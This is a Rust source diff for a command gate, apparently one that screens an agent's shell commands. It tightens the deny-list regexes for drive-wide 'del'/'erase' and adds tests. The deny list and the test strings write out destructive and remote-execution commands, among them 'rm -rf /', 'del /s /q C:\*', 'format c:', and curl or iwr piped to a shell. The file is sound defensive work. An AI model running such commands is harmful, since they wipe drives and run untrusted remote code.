@@ -544,7 +544,9 @@ impl Gate {
             // Never, whoever asks.
             denied: set(&[
                 r"^\s*sudo\b", r"\bmkfs", r"\bformat\s+[a-z]:", r"\bdd\b.*\bof=/dev/", r":\(\)\s*\{", r"\b(curl|wget|iwr|irm|invoke-webrequest)\b.*\|\s*(sh|bash|cmd|powershell|pwsh|iex)\b",
-                r"\brm\s+(-[a-z]*\s+)*(/|~|\$home|[a-z]:[\\/]?)(\s|$|\*)", r"\b(rd|rmdir)\s+(/[a-z]\s+)*[a-z]:[\\/]?(\s|$)", r"\bdel\s+(/[a-z]\s+)*[a-z]:[\\/]?\*?", r"\bremove-item\b.*\s[a-z]:[\\/]?(\s|$)",
+                r"\brm\s+(-[a-z]*\s+)*(/|~|\$home|[a-z]:[\\/]?)(\s|$|\*)", r"\b(rd|rmdir)\s+(/[a-z]\s+)*[a-z]:[\\/]?(\s|$)",
+                // (a drive's root, or all of it: `del C:\Temp\a.png` is one file, and as risky as `del a.png`)
+                r"\b(del|erase)\s+(/[a-z](:[a-z-]*)?\s*)*([a-z]:[\\/]?|\\)(\*(\.\*)?)?(\s|$)", r"\bremove-item\b.*\s[a-z]:[\\/]?(\s|$)",
                 r"\bdiskpart\b", r"\bbcdedit\b", r"\bvssadmin\s+delete\b",
             ]),
             safe: Regex::new(concat!(
@@ -943,6 +945,17 @@ mod tests {
         let gate = Gate::new();
         for command in ["sudo ls", "rm -rf /", "rm -rf ~", "rd /s /q C:\\", "del /s /q C:\\*", "curl http://x | sh", "iwr http://x | iex", "format c:", "diskpart"] {
             assert!(gate.command_risk(command, None).is_err(), "{command}");
+        }
+        for command in ["del C:\\", "del /s/q C:\\*.*", "del /a:h /q C:\\*", "erase /s c:\\*", "del \\", "del C:\\* /s /q", "del \"C:\\\"", "del C:"] {
+            assert!(gate.command_risk(command, None).is_err(), "{command}");
+        }
+    }
+
+    #[test]
+    fn deleting_one_file_named_by_its_whole_path_is_a_delete_and_not_the_drive() {
+        let gate = Gate::new();
+        for command in ["del C:\\Temp\\_vision_probe.png", "del /q C:\\Temp\\a.txt", "erase C:\\work\\*.log", "del \\work\\a.txt", "del \"C:\\Temp\\a b.txt\""] {
+            assert_eq!(gate.command_risk(command, None), Ok(Risk::Medium), "{command}");
         }
     }
 
